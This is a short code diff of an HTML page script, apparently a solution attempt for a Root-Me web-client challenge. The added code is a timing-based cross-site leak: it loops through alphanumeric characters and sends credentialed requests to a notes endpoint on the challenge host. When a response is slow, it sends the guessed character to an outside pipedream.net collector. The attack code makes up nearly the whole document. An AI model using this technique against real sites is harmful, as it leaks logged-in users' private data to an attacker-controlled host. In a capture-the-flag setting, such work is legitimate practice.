@@ -23,18 +23,24 @@
 
     </script> -->
     <script>
-        // Start the clock
-        var start = performance.now()
+        for (let i = 0; i < 62; i++) {
+            let alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+            // Start the clock
+            var start = performance.now()
 
-        // Measure how long it takes to complete the fetch requests
-        fetch(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${3202}/k`, {
-            mode: 'no-cors',
-            credentials: 'include'
-        }).then(() => {
-            // When fetch finishes, calculate the difference
-            var time = performance.now() - start;
-            console.log("The request took %d ms.", time);
-        });
+            // Measure how long it takes to complete the fetch requests
+            fetch(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${3202}/${alpha[i]}`, {
+                mode: 'no-cors',
+                credentials: 'include'
+            }).then(() => {
+                // When fetch finishes, calculate the difference
+                var time = performance.now() - start;
+                console.log("The request took %d ms.", time);
+                if (time > 1000) {
+                    fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
+                }
+            });
+        }
         // const leak = async (url, id) => {
         //     return new Promise((r) => {
         //         let s = document.createElement('script')
